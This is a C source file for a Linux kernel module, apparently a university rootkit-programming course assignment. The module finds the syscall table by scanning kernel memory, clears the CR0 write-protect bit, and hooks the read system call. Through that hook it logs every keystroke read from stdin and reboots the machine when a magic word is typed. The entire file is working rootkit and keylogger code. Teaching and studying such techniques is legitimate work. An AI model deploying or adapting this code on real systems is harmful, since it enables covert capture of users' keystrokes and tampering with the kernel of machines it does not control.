
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 9                                                             */
/*                                                                             */
/*   Filename: dyn_interceptor.c                                                   */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: October 2015                                                        */
/*                                                                             */
/*   Usage: This kernel module hooks the read system call and outputs the      */
/*          intercepted data when reading from stdin. Additionaly, when a      */
/*          magic command gets intercepted it performs a panic-less system     */
/*          reboot.                                                            */
/*          The syscall table is found dynamically                             */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>   /* Needed by all modules */
#include <linux/unistd.h>   /* Needed for __NR_read */
#include <linux/reboot.h>   /* Needed for kernel_restart() */
#include <linux/syscalls.h>

#define CR0_WRITE_PROTECT_MASK (1 << 16)
#define MAGIC "mamaliga"
#define SIZEOF_MAGIC 8


void **sys_call_table;
asmlinkage long (*read_syscall_ref)(unsigned int fd, char __user *buf, size_t count);
int pos;    /* Size of MAGIC matched so far */

/* Function that replaces the original read_syscall. In addition to what
   read_syscall does, it also prints keypresses and reboots when the MAGIC
   command is encountered. */
asmlinkage long my_read_syscall_ref(unsigned int fd, char __user *buf, size_t count)
{
	long ret;
	int i;

	/* Call original read_syscall */
	ret = read_syscall_ref(fd, buf, count);

	/* A keypress has a length of 1 byte and is read from STDIN (fd == 0) */
	if (count != 1 || fd != 0)
		return ret;

	/* The magic command is partial, print what was written so far */
	if (MAGIC[pos] != buf[0]) {
		for (i = 0; i < pos; ++i)
			printk(KERN_INFO "Found: %c", MAGIC[i]);

		pos = 0;
		printk(KERN_INFO "Found: %c", buf[0]);
		return ret;
	}

	pos++;

	/* MAGIC was typed, reboot */
	if (SIZEOF_MAGIC <= pos) {
		printk(KERN_INFO "Mouaxaxaxaxaxa!");
		kernel_restart(NULL);
	}

	return ret;
}


#define START_MEM	PAGE_OFFSET
#define END_MEM		ULLONG_MAX

static unsigned long** find_syscall_table(void)
{
	unsigned long **sctable;
	unsigned long int i = START_MEM;

	while ( i < END_MEM) {
		sctable = (unsigned long **)i;

		if (sctable[__NR_close] == (unsigned long *)sys_close) {
			printk(KERN_INFO "Found syscall_table at %p\n", &sctable[0]);
			return &sctable[0];
		}

		i += sizeof(void *);
	}


	printk(KERN_INFO "Unable to find syscall table :(\n");
	return NULL;
}

static int __init interceptor_start(void)
{
	unsigned long original_cr0;

	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	original_cr0 = read_cr0();

    /* Disable `write-protect` mode. Do so by setting the WP (Write protect)
       bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~CR0_WRITE_PROTECT_MASK);

	/* Store original read() syscall */
	sys_call_table = (void *) find_syscall_table();
	read_syscall_ref = (void *) sys_call_table[__NR_read];

	/* Replace in the system call table the original
	   read() syscall with our intercepting function */
	sys_call_table[__NR_read] = (unsigned long *) my_read_syscall_ref;

	/* Enable `write-protect` mode */
	write_cr0(original_cr0);

	printk(KERN_INFO "%s\n", "Hello");

	/* A non 0 return value means init_module failed; module can't be loaded */
	return 0;
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original read() syscall. */
static void __exit interceptor_end(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

    /* Disable `write-protect` mode */
	write_cr0(original_cr0 & ~CR0_WRITE_PROTECT_MASK);

	/* Restore original read() syscall */
	sys_call_table[__NR_read] = (unsigned long *) read_syscall_ref;

	/* Enable `write-protect` mode */
	write_cr0(original_cr0);

	printk(KERN_INFO "%s\n", "Bye bye");

	return;
}

module_init(interceptor_start);
module_exit(interceptor_end);

MODULE_LICENSE("GPL");
